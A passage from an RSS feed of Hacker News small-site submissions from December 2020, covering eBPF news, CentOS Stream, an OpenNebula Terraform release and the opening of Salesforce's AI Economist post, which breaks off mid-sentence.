<figure><img data-attachment-id="13077" data-permalink="https://alecmuffett.com/article/13075/screenshot-2020-12-21-at-16-11-51" data-orig-file="https://alecmuffett.com/wp-content/uploads/2020/12/Screenshot-2020-12-21-at-16.11.51.png" data-orig-size="1956,1164" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screenshot-2020-12-21-at-16.11.51" data-image-description="" data-medium-file="https://alecmuffett.com/wp-content/uploads/2020/12/Screenshot-2020-12-21-at-16.11.51-300x179.png" data-large-file="https://alecmuffett.com/wp-content/uploads/2020/12/Screenshot-2020-12-21-at-16.11.51-1024x609.png" loading="lazy" width="1024" height="609" src="https://alecmuffett.com/wp-content/uploads/2020/12/Screenshot-2020-12-21-at-16.11.51-1024x609.png" alt="" srcset="https://alecmuffett.com/wp-content/uploads/2020/12/Screenshot-2020-12-21-at-16.11.51-1024x609.png 1024w, https://alecmuffett.com/wp-content/uploads/2020/12/Screenshot-2020-12-21-at-16.11.51-300x179.png 300w, https://alecmuffett.com/wp-content/uploads/2020/12/Screenshot-2020-12-21-at-16.11.51-150x89.png 150w, https://alecmuffett.com/wp-content/uploads/2020/12/Screenshot-2020-12-21-at-16.11.51-768x457.png 768w, https://alecmuffett.com/wp-content/uploads/2020/12/Screenshot-2020-12-21-at-16.11.51-1536x914.png 1536w, https://alecmuffett.com/wp-content/uploads/2020/12/Screenshot-2020-12-21-at-16.11.51.png 1956w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px" data-lazy-srcset="https://alecmuffett.com/wp-content/uploads/2020/12/Screenshot-2020-12-21-at-16.11.51-1024x609.png 1024w, https://alecmuffett.com/wp-content/uploads/2020/12/Screenshot-2020-12-21-at-16.11.51-300x179.png 300w, https://alecmuffett.com/wp-content/uploads/2020/12/Screenshot-2020-12-21-at-16.11.51-150x89.png 150w, https://alecmuffett.com/wp-content/uploads/2020/12/Screenshot-2020-12-21-at-16.11.51-768x457.png 768w, https://alecmuffett.com/wp-content/uploads/2020/12/Screenshot-2020-12-21-at-16.11.51-1536x914.png 1536w, https://alecmuffett.com/wp-content/uploads/2020/12/Screenshot-2020-12-21-at-16.11.51.png 1956w" data-lazy-src="https://alecmuffett.com/wp-content/uploads/2020/12/Screenshot-2020-12-21-at-16.11.51-1024x609.png?is-pending-load=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>One of my favourite extracts from â€œThe Tao of Programmingâ€, <a href="http://motd.ambians.com/quotes.php/name/linux_computers/toc_id/1-1-4/s/741">via</a></figcaption></figure>
	</div><!-- .entry-content -->

	 <!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://alecmuffett.com/article/13075</link>
            <guid isPermaLink="false">hacker-news-small-sites-25496787</guid>
            <pubDate>Mon, 21 Dec 2020 17:01:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Textyle â€“ Online Tilemap Editor (ReactJS, WebGL and Rust (WASM))]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25496710">thread link</a>) | @dark-phobia
<br/>
December 21, 2020 | https://textyle.app/edit/ | <a href="https://web.archive.org/web/*/https://textyle.app/edit/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://textyle.app/edit/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25496710</guid>
            <pubDate>Mon, 21 Dec 2020 16:55:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[eBPF Updates 2nd issue. Collection of news and links about eBPF]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25496621">thread link</a>) | @genbit
<br/>
December 21, 2020 | https://ebpf.io/news/ebpf-updates-2020-12 | <a href="https://web.archive.org/web/*/https://ebpf.io/news/ebpf-updates-2020-12">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div>
<h2 id="foreword"><a href="#foreword" aria-label="foreword permalink"></a>Foreword</h2>
<p>Welcome to the second issue of the <em>eBPF Updates</em>! This time we have
interesting resources about how to write eBPF programs with Zig, or with Rust,
or on how to manage them with libbpf. On the kernel side, modules now support
BTF, and improvements to memory accounting for eBPF should help to solve the
limitations of rlimit. Did this just sound incomprehensible to you? Do not
fear, we also have some gentle introductions to eBPF in the list. This issue
also introduces a â€œDid You Knowâ€ section, and this time the focus is on CO-RE.
Read, learn, trace, and filter!</p>
<h2 id="important-news"><a href="#important-news" aria-label="important news permalink"></a>Important News</h2>
<p>The calls for participation (CFPs) for the devrooms for
<a href="https://fosdem.org/2021/">FOSDEM 2021</a> (online event) are open. Some of the
devrooms have hosted multiple talks about eBPF over the last year. In
particular:</p>
<ul>
<li>The SDN devroom (<a href="https://mdr78.github.io/2020/12/01/fosdem-cfp.html">CFP</a>)
accepts submissions until the 20th of December 2020.</li>
<li>The Containers devroom
(<a href="https://discuss.linuxcontainers.org/t/fosdem-2021-containers-devroom-call-for-papers/9625">CFP</a>)
accepts submissions until the 22th of December 2020.</li>
</ul>
<p>Recent start-up acquisitions highlight the growing adoption and the maturity of
eBPF:</p>
<ul>
<li><a href="https://www.flowmill.com/">Flowmill</a>, offering a solution for network
observability relying on eBPF,
<a href="https://techcrunch.com/2020/11/24/splunk-acquires-network-observability-service-flowmill/">has been acquired</a>
by <a href="https://www.splunk.com/en_us/newsroom/press-releases/2020/splunk-to-acquire-network-performance-monitoring-leader-flowmill.html">Splunk</a>.</li>
<li><a href="https://pixielabs.ai/">Pixie Labs</a>, which uses eBPF for visibility in
Kubernetes,
<a href="https://techcrunch.com/2020/12/10/new-relic-acquires-kubernetes-observability-platform-pixie-labs/">has been acquired</a>
by <a href="https://blog.newrelic.com/product-news/pixie-developer-first-observability/">New Relic</a>.</li>
</ul>
<p>Readers from Brazil may be interested in the <a href="https://ebpfbr.org/">eBPF Brasil</a>
website, which aims at gathering, translating, and sharing knowledge about
eBPF.</p>

<p>eBPF was named as one of the 5 technologies to watch in 2021 by CNCF TOC chair
<a href="https://twitter.com/lizrice">Liz Rice</a>, and the eBPF community just keeps on
growing every day.</p>
<p><span>
      <a href="https://ebpf.io/static/46c6d0cb6279e137c838606098a3a67b/91608/community.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="community" title="community" src="https://ebpf.io/static/46c6d0cb6279e137c838606098a3a67b/8c557/community.png" srcset="https://ebpf.io/static/46c6d0cb6279e137c838606098a3a67b/4edbd/community.png 175w,
https://ebpf.io/static/46c6d0cb6279e137c838606098a3a67b/13ae7/community.png 350w,
https://ebpf.io/static/46c6d0cb6279e137c838606098a3a67b/8c557/community.png 700w,
https://ebpf.io/static/46c6d0cb6279e137c838606098a3a67b/e996b/community.png 1050w,
https://ebpf.io/static/46c6d0cb6279e137c838606098a3a67b/91608/community.png 1251w" sizes="(max-width: 700px) 100vw, 700px" loading="lazy">
  </a>
    </span></p>
<h2 id="new-resources"><a href="#new-resources" aria-label="new resources permalink"></a>New Resources</h2>
<h3 id="blog-posts-presentations"><a href="#blog-posts-presentations" aria-label="blog posts presentations permalink"></a>Blog Posts, Presentations</h3>
<ul>
<li><a href="https://blog.container-solutions.com/the-top-reasons-why-you-should-give-ebpf-a-chance"><em>The Top Reasons Why You Should Give eBPF a Chance</em></a>,
from Lucas Severo Alves.<br>
Several factors are responsible for eBPF's success and should make readers
consider learning about, or using, this technology. This post cites its
powerful tracing capabilities, with the ability to attach to nearly any
function in the kernel with little impact on performance. Another reason is
that more and more companies, including large ones, are adopting eBPF; a
detailed list follows. At last, eBPF makes it possible to quickly develop
tools to instrument new parts of the kernel, without the need to go through a
longer process to upstream new attach points.</li>
<li><a href="https://cmd.com/blog/making-bpf-easy-with-libbpf-and-zig/"><em>Making BPF easy with libbpf and Zig</em></a>,
from Matt Knight.<br>
The <a href="https://ziglang.org/">Zig</a> programming language is used to create and
handle a simple eBPF program in this tutorial, both for the user space loader
and the eBPF program itself. The objective is mostly to understand how libbpf
manipulates the ELF object containing a program in order to load it, but
compiling from Zig, which aims at competing with C while offering some newer
features, may open new perspectives. The code is available
<a href="https://github.com/mattnite/zig-bpf-intro">on GitHub</a>.</li>
<li><a href="https://github.com/cilium/cilium/pull/13943">Weight support for Cilium's eBPF-based Maglev load balancer implementation</a>,
from Fankaixi Li.<br>
A new pull request by a software engineer at ByteDance (TikTok) popped up,
adding weight support to the eBPF-based
<a href="https://cilium.io/blog/2020/11/10/cilium-19#maglev">Maglev implementation in Cilium</a>.
Maglev provides consistent hashing for high-availability scenarios, and
balance packets to the same backends even if they arrive at different load
balancing nodes. The feature adds the possibility to assign weights to favor
some backends. It is still being discussed, but should land soon.</li>
<li><a href="https://kccncna20.sched.com/event/ekDR/beyond-the-buzzword-bpfs-unexpected-role-in-kubernetes-andrew-randall-alban-crequy-kinvolk"><em>Beyond the Buzzword: BPFâ€™s Unexpected Role in Kubernetes</em></a>,
from Andrew Randall and Alban Crequy.<br>
After a high-level overview of eBPF, this presentation depicts the landscape
of the projects gravitating around this technology. The authors explain that
there are many powerful tools based on eBPF, although none of them would
cover Kubernetes clusters. As an answer to fill the gap, they introduce
Inspektor Gadget, which reuses some elements from the bcc tools to provide a
new set of monitoring gadgets for examining Pods. Note that the wording in
the slides might be misleading: If there was no equivalent to bcc for tracing
containers before Inspektor Gadget, there <em>are</em> other tools targeting the
platform, such as Cilium/Hubble for network and observability or BPFd for
running bcc scripts in containers.</li>
<li><a href="https://filipnikolovski.com/posts/ebpf/"><em>TIL: eBPF is awesome</em></a>,
from Filip Nikolovski.<br>
We all agree on this! This post is a gentle introduction to eBPF. A bit of
history, some details on the core infrastructure and its components, and a
simple â€œHello, World!â€ example extracted from
<a href="https://github.com/iovisor/bcc/blob/34cada17f798b8e00268d1ba4a4a8d765b948532/examples/tracing/hello_fields.py">the bcc tools</a>.
A nice read if you just got started with eBPF.</li>
<li><a href="https://suchakra.wordpress.com/2020/11/20/building-an-esoteric-filesystem-tracing-tool-with-ebpf/"><em>Building an Esoteric Filesystem Tracing Tool with eBPF</em></a>,
from Suchakra Sharma.<br>
This post has a focus on the read-ahead mechanism in the Linux kernel. After
providing a refresher on how read-ahead works, Suchakra explains in details
how eBPF can monitor the hit rate and efficiency of this mechanism. It turns
out that the program used to do that already exists in two versions, one with
a mix of C and Python proper to the bcc tools, and another one based on
libbpf and the newer features brought by the library, like CO-RE (Compile
Once, Run Everywhere). The last section details the benefits of the latter
version and the motivations to port tools to libbpf.</li>
<li><a href="https://lac2020.sciencesconf.org/data/proceedings.pdf#section*.12"><em>eXpress Data Path Kernel Objects for Real-Time Audio Streaming Optimization</em></a> (PDF),
from Christoph Kuhr and Alexander CarÃ´t.<br>
Focusing on audio packet processing, this work aims at facilitating the set
up of a rehearsal environment for conducted orchestras via the Internet with
up to sixty musicians. The system may be susceptible to latency issues when
the different UDP streams must be processed and combined. The authors
investigated the use of XDP for processing these UDP streams, aggregating
them in the kernel and reporting only the final audio sample to the user
application. The authors found that XDP was not ideal, because of its lack of
floating-point operations and because it does not permit to retrieve hardware
timestamps. They were also limited by the incompatibility between LLVM, used
to compile the eBPF programs, and their build system, and could not
experiment on one part of their frontend. And although XDP increased the
performance, they realized that they could obtain similar speeds for their
use case with an optimized handling of a generic raw socket. Still, the use
case and experiment remain an interesting read.<br>
Video of the presentation may be available in the future from
<a href="https://lac2020.sciencesconf.org/">the page of the conference</a>, if it gets
uploaded.</li>
<li><a href="https://thenewstack.io/primer-how-xdp-and-ebpf-speed-network-traffic-via-the-linux-kernel/"><em>Primer: How XDP and eBPF Speed Network Traffic via the Linux Kernel</em></a>,
from Jack Wallen.<br>
There is a resolute focus on XDP in this article which describes how this
eBPF hook can speed up network traffic on Linux. This is followed by a simple
tutorial, where bcc is used to attach a XDP program and to track UDP packets
sent to a given port.</li>
<li><a href="https://nakryiko.com/posts/libbpf-bootstrap/"><em>Building BPF applications with libbpf-boostrap</em></a>,
from Andrii Nakryiko.<br>
You want to start developing an eBPF application, but you feel intimidated by
libbpf's complexity or lack of documentation? You <em>must</em> have a look at
libbpf-bootstrap. This project builds simple application templates, on which
you can directly build your software. Of the two available templates, the
simplest one (<code>minimal</code>) manipulates an eBPF program that simply logs the PID
of the process that calls it. The more advanced template (<code>bootstrap</code>) sets
up an application with more advanced features like eBPF maps, read-only
configuration variables, eBPF ring buffer, or CO-RE which needs a BTF (BPF
Type Format) description of the kernel's internals. This means that using
these features gets simple and immediate, all is set up for you in the
template. This article goes into a thorough description of the mechanisms
involved. This is a long read, but well worth it if you want to program
applications working with eBPF.</li>
<li><a href="https://pluginized-protocols.org/xbgp/2020/11/29/xbgp-hello.html"><em>A first xBGP plugin</em></a>,
from Thomas Wirtgen.<br>
As a follow-up from the link to the paper for xBGP in the previous issue of
these <em>eBPF Updates</em>, this is the introduction of a first eBPF-based xBGP
plugin. The idea is that, quoting the post, â€œ<em>a network operator would like
to ignore the BGP UPDATE messages that contain an unknown attribute. A
practical example of this usage is when problems with the processing of BGP
Path attribute 128 caused the failure of BGP sessions</em>â€. All steps required
for running this example are provided. The code is hosted on
<a href="https://github.com/pluginized-protocols/xbgp_plugins.git">GitHub</a>, but there
is also a
<a href="https://github.com/pluginized-protocols/libxbgp/blob/master/misc/Dockerfile_xbgp">Dockerfile</a>
packaging all the required elements.</li>
<li><a href="https://docs.google.com/presentation/d/1cB4rJcdxTolIIUy5IEcb9iiUJHlMNmyT7c5eYY9D5LU/edit?usp=sharing"><em>Cilium &amp; eBPF - From Device to Service-Centric Networking</em></a>,
from Thomas Graf.<br>
In this presentation at the NAG (Network Architecture Geeks) Cafe in
December, Thomas outlines how eBPF allows to build powerful service-centric
networking models and how to evolve away from the old device-centric
networking architecture to meet requirements of containers and cloud-native
environments.</li>
<li><a href="https://medium.com/simplestaking/integrating-an-ebpf-based-firewall-into-the-tezedge-node-with-multipass-validations-769d4c6ccd93"><em>Integrating an eBPF-based firewall into the TezEdge node with multipass validations</em></a>,
from Juraj Selep.<br>
TezEdge peer-to-peer nodes validate blocks for the decentralized
<a href="https://en.wikipedia.org/wiki/Tezos">Tezos</a> blockchain, providing smart
contracts. Blockchain networks are subject to DDoS (Distributed Denial of
Service) attacks, generally mitigated with a firewall. In the current case,
XDP is used to implement it. The eBPF program checks that each connection
starts with a valid and unique proof of work, making it expensive for an
adversary to start many connections. This is further integrated with the
â€œmultipass validationâ€ scheme that aims at detecting erroneous blocks as soon
as possible. Note that the eBPF programs are written in Rust.</li>
<li><a href="https://en.pingcap.com/blog/why-we-switched-from-bcc-tools-to-libbpf-tools-for-bpf-performance-analysis"><em>Why We Switched from bcc-tools to libbpf-tools for BPF Performance Analysis</em></a>,
from Wenbo Zhang.<br>
Another article on the benefits brought by CO-RE, for which libbpf provides
good support. After comparing bcc-based and libbpf-based tracing tools in
terms of features and memory footprint, the author provide a list of tools
and invocation patterns they use to analyze I/O performance.</li>
<li><a href="https://cilium.io/blog/2020/12/11/kube-proxy-free-cve-mitigation"><em>How to mitigate Kubernetes CVE-2020-8554 with eBPF</em></a>
from Jed Salazar.<br>
<a href="https://github.com/kubernetes/kubernetes/issues/97076">CVE-2020-8554</a>
represents a MITM (Man-in-the-middle) attack in Kubernetes where the
ExternalIP service feature can be used to attack a workload and redirect
egress network traffic from a unsuspecting Pod to another destination. In
this blog, Jed describes how Cilium is able to â€¦</li></ul></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ebpf.io/news/ebpf-updates-2020-12">https://ebpf.io/news/ebpf-updates-2020-12</a></em></p>]]>
            </description>
            <link>https://ebpf.io/news/ebpf-updates-2020-12</link>
            <guid isPermaLink="false">hacker-news-small-sites-25496621</guid>
            <pubDate>Mon, 21 Dec 2020 16:47:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Annoying Technology]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25496558">thread link</a>) | @ggoo
<br/>
December 21, 2020 | https://annoying.technology/posts/c7cd70e3bb013f89/ | <a href="https://web.archive.org/web/*/https://annoying.technology/posts/c7cd70e3bb013f89/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://d33wubrfki0l68.cloudfront.net/d9030eaef3d2c4f4f44c22d105bb531d05aa17d9/a04c1/media/dhl.png"></p><p>I simply clicked the tracking link in the confirmation email I got from DHL. This number (I redacted it via web inspector for the screenshot) comes from <strong>you</strong>, not from me. Check yourself.</p></div></div>]]>
            </description>
            <link>https://annoying.technology/posts/c7cd70e3bb013f89/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25496558</guid>
            <pubDate>Mon, 21 Dec 2020 16:42:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Who I think CentOS Stream is and isn't for]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25496527">thread link</a>) | @andyjpb
<br/>
December 21, 2020 | https://utcc.utoronto.ca/~cks/space/blog/linux/CentOSStreamWhoFor | <a href="https://web.archive.org/web/*/https://utcc.utoronto.ca/~cks/space/blog/linux/CentOSStreamWhoFor">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Who I think CentOS Stream is and isn't for</h2>

	<p><small>December 20, 2020</small></p>
</div><div><p>As time goes by and <a href="https://blog.centos.org/2020/12/balancing-the-needs-around-the-centos-platform/">Red Hat people write more official posts</a>
(<a href="https://lobste.rs/s/qrtyaa/balancing_needs_around_centos_platform">via</a>), I've
grown some opinions on who it feels that CentOS Stream is for and
is not for. Since I also feel that Red Hat people are not being
<a href="https://twitter.com/thatcks/status/1340488916613390337">completely straightforward</a>, I am going to
write out my views, as an outsider to the CentOS project but someone who
uses CentOS (and Ubuntu LTS) and has in the past used RHEL.</p>

<p>If you want to see if your software will work with upcoming package
updates for the latest version of Red Hat Enterprise, CentOS Stream
is definitely for you. Giving people a preview of RHEL updates is
the expressed purpose of CS. You will not necessarily always be
able to build software for RHEL using CentOS Stream, because of
periodic ABI and API issues, but Red Hat will probably have a
solution for that at some point. CentOS Stream is also probably
for you if you operate RHEL systems and want some 'canary' ones
to see how future package updates are likely to affect you (and
if you see any new bugs or issues).</p>

<p>It's quite possible that for an open source project, using CentOS
Stream will also be the easiest way of testing if your software
(probably) works on the latest version of RHEL (at least in a fully
updated state). However, I'm not all that familiar with the options
Red Hat has here (such as their 'Universal Base Image'), and Red
Hat may introduce more in the future. If you're a commercial
company, <a href="https://centos.org/distro-faq/">the CentOS project distro FAQ</a>
makes it clear that Red Hat wants you to buy commercial RHEL licenses.</p>

<p>(Since CentOS Stream for 8 will end package updates in mid 2024,
open source projects who want to continue testing for RHEL 8 beyond
that point are going to have a problem. I expect that at least some
open source projects will simply drop official compatibility with
RHEL 8 at that point.)</p>

<p>If for some reason you want to contribute to Red Hat Enterprise,
CentOS Stream is also officially for you. The most likely case I
can imagine is that you use RHEL (or CentOS) and you have a bugfix
or small improvement that you want to push for and contribute, one
that Red Hat itself seems unlikely to take on. If you intend to
make larger contributions, I hope that you have a strong commercial
reason for helping a commercial company with its commercial product.</p>

<p>(To me, this raises significant questions about the future of <a href="https://fedoraproject.org/wiki/EPEL">EPEL</a>. However, Red Hat funds Fedora
too, so it could decide to work on funding EPEL should a supply of
outside volunteers start to dry up.)</p>

<p>If you want a free RPM based Linux distribution that probably has
a five-year support period, CentOS Stream may deliver what you're
looking for. Officially it's supposed to, at least at the moment,
<a href="https://utcc.utoronto.ca/~cks/space/blog/linux/CentOSStreamSuitability">but one can have concerns about the future</a>
and as far as I can tell this is not what CentOS Stream is 'supposed'
to be for, at least in the eyes of Red Hat (and Red Hat calls the
shots). <a href="https://www.opensuse.org/">openSUSE Leap</a> is RPM based
and free, but <a href="https://en.opensuse.org/Lifetime">it's only supported for 3 years</a>. Fedora, of course, is RPM based
and free but only supported for one year, with version to version
migration and an expectation that you'll always be on the most
current version.</p>

<p>If you want a well supported Linux distribution with an extremely
long support period and fast security updates, CentOS was never
really for you in the first place and CentOS Stream is worse (because
it definitely has no more than five years of package updates and
may have longer delays for security updates). In the past you could
press CentOS into service as such a thing and ignore, for example,
the delay between RHEL security updates and the rebuilt CentOS
security updates that corresponded to them, but you were always
accepting a compromise. Now that compromise has blown up on you,
although so far only for users of CentOS 8.</p>

<p>(CentOS currently says it will continue supporting CentOS 7 through
the end of life of RHEL 7 itself. Since Red Hat calls the shots, I
am not certain we should be as confident of that as we might have
been before.)</p>

<p>If you want a free version of Red Hat Enterprise Linux, the traditional
purpose of CentOS, Red Hat more or less says that CentOS Stream is
not for you. It is extremely likely that one goal of Red Hat's
management is to make it so that no such thing exists any more (and
certainly not one that they help pay for). At the moment the closest
you can probably come is Oracle Linux, which is also a rebuild of
RHEL, but that's if you're willing to put your trust in Oracle (many
people are not). It's possible that you can use CentOS Stream for
this anyway, but if a lot of people do so I expect Red Hat to take
additional steps to discourage this, such as by dropping 'CentOS
Stream for 8' support when RHEL 9 comes out (or even before then).</p>

<p>Since 'a free version of RHEL, including its long support period'
<a href="https://twitter.com/thatcks/status/1340488916613390337">was in fact what many people used CentOS for</a>, this
leaves a significant number of CentOS users without an obvious Linux
distribution to use at the moment, although options may well appear
in the future.</p>
</div></div>]]>
            </description>
            <link>https://utcc.utoronto.ca/~cks/space/blog/linux/CentOSStreamWhoFor</link>
            <guid isPermaLink="false">hacker-news-small-sites-25496527</guid>
            <pubDate>Mon, 21 Dec 2020 16:39:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[New Release of the Terraform Provider for OpenNebula]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25496477">thread link</a>) | @amarti
<br/>
December 21, 2020 | https://opennebula.io/new-release-of-the-terraform-provider-for-opennebula/ | <a href="https://web.archive.org/web/*/https://opennebula.io/new-release-of-the-terraform-provider-for-opennebula/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
			    <!-- .entry-header -->

				
					
<article id="post-29538">

    <!-- .entry-header -->

    <div>

		
<p>Itâ€™s been a year since the <a rel="noreferrer noopener" href="https://registry.terraform.io/providers/OpenNebula/opennebula/latest" target="_blank">Terraform Provider for OpenNebula</a>â€”a Community initiative led by <a rel="noreferrer noopener" href="https://www.iguanesolutions.com/" target="_blank">Iguane Solutions</a> and <strong>OpenNebula Systems</strong>â€”was <a href="https://opennebula.io/terraform-provider-for-opennebula-now-officially-approved/" target="_blank" rel="noreferrer noopener">officially approved by HashiCorp</a>. A provider is responsible for understanding API interactions with the underlying infrastructure, in this case OpenNebula. The <strong>Provider Development Program</strong> allows vendors to build Terraform providers that are<strong> officially approved and tested by HashiCorp</strong>.</p>



<p>In mid-2020 we released a <a rel="noreferrer noopener" href="https://github.com/OpenNebula/terraform-provider-opennebula/blob/master/CHANGELOG.md" target="_blank">second version</a> of the Terraform Provider, which included a number of interesting new features, including support for VM Groups and ACL, and enhancements like VM templates, tags, and timeout on some of those resources that can take a while to get ready (i.e. images and VMs). We discussed some of these back in July during an <strong>OpenNebula Webinar</strong> in which we participated along with <strong>Taylor Dolezal</strong> (Senior Developer Advocate at HashiCorp):</p>



<figure><p>
<iframe title="OpenNebula Webinar - Infrastructure as Code in OpenNebula using Terraform (Jul 20, 2020)" width="640" height="360" src="https://www.youtube.com/embed/JP-tzfz3R74?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p>Now, after several months of intense work, we are excited to announce the <strong>third version of the Terraform Provider for OpenNebula</strong>! ğŸš€ These are some of the <a href="https://github.com/OpenNebula/terraform-provider-opennebula/blob/master/CHANGELOG.md" target="_blank" rel="noreferrer noopener">improvements</a> that this new version brings along:</p>



<p>New Resources:</p>



<ul><li>User management: creation, update and deletion.</li><li>Service management (<a href="https://docs.opennebula.io/5.12/advanced_components/application_flow_and_auto-scaling/overview.html" target="_blank" rel="noreferrer noopener">OneFlow</a>).</li></ul>



<p>Important improvements:&nbsp;</p>



<ul><li>Attach / Detach NIC on a Virtual Machine</li><li>Attach / Detach Disk on a Virtual Machine</li><li>Resize a disk on a Virtual Machine</li><li>Add importer for Groups, Users and VDC</li></ul>



<p>As you see, this release is a <strong>huge step forward</strong> in making it easier for users to manage a running cluster. Until now, Terraform was really helpful for the deployment and deletion of a platform. However, updating running resources was still quite painful. Thanks to this new release, you can update running VMs without using Sunstone or CLI!</p>



<p>Kudos to all the people that made this new release possible! ğŸ‘</p>



<p><strong>Iguane Solutions team</strong>:</p>



<ul><li><a href="https://github.com/jaypif" target="_blank" rel="noreferrer noopener">Jean-Philippe FourÃ¨s</a></li><li><a href="https://github.com/treywelsh" target="_blank" rel="noreferrer noopener">Pierre Lafievre</a></li></ul>



<p><strong>OpenNebula Systems team</strong>:</p>



<ul><li><a href="https://github.com/christian7007" target="_blank" rel="noreferrer noopener">Christian GonzÃ¡lez</a></li><li><a href="https://github.com/tinova" target="_blank" rel="noreferrer noopener">Tino VÃ¡zquez</a></li></ul>



<p><strong>External contributors</strong>:</p>



<ul><li><a href="https://github.com/puppetmaster" target="_blank" rel="noreferrer noopener">Philippe Caseiro</a></li><li><a href="https://github.com/noroute" target="_blank" rel="noreferrer noopener">Florian Thiel</a></li><li><a href="https://github.com/yoheiW" target="_blank" rel="noreferrer noopener">Yohei Watanabe</a></li><li><a href="https://github.com/BeryJu" target="_blank" rel="noreferrer noopener">Jens Langhammer</a></li></ul>



<p>As usual, comments, questions and contributions are more than welcome! ğŸ¤“</p>







<h2><strong>Relevant Links</strong></h2>



<ul><li><a rel="noreferrer noopener" href="https://registry.terraform.io/providers/OpenNebula/opennebula/latest" target="_blank">Terraform Provider for OpenNebula</a></li><li><a rel="noreferrer noopener" href="https://registry.terraform.io/providers/OpenNebula/opennebula/latest/docs" target="_blank">Official Documentation</a></li><li><a rel="noreferrer noopener" href="https://github.com/OpenNebula/terraform-provider-opennebula" target="_blank">GitHub Repository</a></li></ul>
		
		


        <div>
            <p><img alt="" src="https://secure.gravatar.com/avatar/55d4ce03cedbf452a4e8a7e02207be2e?s=96&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/55d4ce03cedbf452a4e8a7e02207be2e?s=192&amp;d=mm&amp;r=g 2x" height="96" width="96">            </p>
            
        </div>
	</div><!-- .entry-content -->

</article><!-- #post-## -->

					
<!-- #comments -->

				
			</div></div>]]>
            </description>
            <link>https://opennebula.io/new-release-of-the-terraform-provider-for-opennebula/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25496477</guid>
            <pubDate>Mon, 21 Dec 2020 16:36:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AI Economist: Improving Equality and Productivity with AI-Driven Tax Policies]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25496410">thread link</a>) | @looshfarmer
<br/>
December 21, 2020 | https://blog.einstein.ai/the-ai-economist/ | <a href="https://web.archive.org/web/*/https://blog.einstein.ai/the-ai-economist/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  <div>
      <div>
          <figure><iframe width="480" height="270" src="https://www.youtube.com/embed/4iQUcGyQhdA?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><figcaption>The AI Economist learns dynamic tax policies that optimize equality along with productivity in simulated economies, outperforming alternative tax systems.</figcaption></figure><ul><li>Economic inequality is accelerating globally and is a growing concern due to its negative impact on economic opportunity, health and social welfare. Taxes are important tools for governments to reduce inequality. However, finding a tax policy that optimizes equality along with productivity is an unsolved problem. The AI Economist brings reinforcement learning (RL) to tax policy design for the first time to provide a purely simulation and data-driven solution. </li><li>The AI Economist uses a two-level RL framework (agents and tax policy) to learn dynamic tax policies in principled economic simulations. This framework does not use prior world knowledge or modeling assumptions, can directly optimize for any socioeconomic objective, and learns from observable data alone.</li><li>Our experiments show the AI Economist can improve the trade-off between equality and productivity by 16%, compared to a prominent tax framework proposed by Emmanuel Saez, with even larger gains over an adaptation of the US Federal income tax and the free market. </li><li>Without endorsing this particular schedule, it is interesting that the AI Economist implements qualitatively different tax schedules than the baselines, with higher top tax rates and lower rates for middle incomes. Furthermore, it is robust in the face of emergent tax gaming strategies.</li><li>Moreover, the AI Economist is effective in simulations with human participants, achieving competitive equality-productivity trade-offs with the baselines and significantly higher income-weighted average social welfare. This suggests promise in using this approach to improve social outcomes in real economies.</li><li>Our vision for the AI Economist is to enable an objective study of policy impact on real-world economies, at a level of complexity that traditional economic research cannot easily address. We believe the intersection of machine learning and economics presents a wide range of exciting research directions, and gives ample opportunity for machine learning to have positive social impact.</li></ul><p>Our work fits within a larger context of recent advances in RL. RL has been used to train AIs to win competitive games, such as Go, Dota, and Starcraft. In those settings, the RL objective is inherently adversarial (Ã¢â‚¬Å“beat-the-other-teamÃ¢â‚¬ï¿½). Machine learning has also been used for the design of auction rules. In this work, we instead focus 